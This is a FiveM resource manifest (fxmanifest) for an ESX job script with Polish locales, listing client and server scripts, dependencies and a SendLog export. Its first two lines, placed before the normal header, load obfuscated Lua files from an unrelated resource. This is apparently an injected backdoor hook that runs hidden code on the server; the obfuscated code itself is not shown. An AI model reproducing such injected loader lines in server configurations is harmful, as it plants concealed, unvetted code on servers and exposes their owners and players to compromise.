shared_script '@apple_job/shared_fg-obfuscated.lua'
shared_script '@apple_job/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'
games { 'gta5' }
lua54 'yes'
author 'exile'
client_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}
shared_scripts { 
	'@es_extended/imports.lua',
}
server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}
dependencies {
	'es_extended',
	'cron',
	'esx_addonaccount'
}
server_exports {
	'SendLog'
}
